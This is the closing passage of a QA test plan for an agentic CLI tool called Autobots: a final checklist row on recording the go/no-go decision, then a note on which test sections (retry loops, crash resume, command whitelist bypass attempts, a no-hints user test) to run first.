| AB-594 | Final go/no-go decision recorded with rationale, separate from the raw pass percentage | A 98% pass rate with one unresolved data-loss bug is still a "no" | ⬜ |

---

## Closing note

Autobots is architecturally ambitious — nine specialized clusters, 17 injected domain skills, full validation/repair/rollback loops, and three execution modes is genuinely more sophisticated on paper than what either Claude Code or OpenCode expose to a user. That sophistication is exactly why this suite is this long: the surface area for something to quietly break is proportionally larger too.

The categories most likely to actually fail on first real pass, based on what tends to break in agentic CLIs like this: **Section 17 (repair/retry loops)**, **Section 21 (crash resume)**, **Section 23 (command whitelist bypass attempts)**, and **Section 50 (the actual stranger-with-no-hints test)**. If you only have time to run a subset before your next session, run those four sections first — they're the ones that decide whether this is a toy or a tool.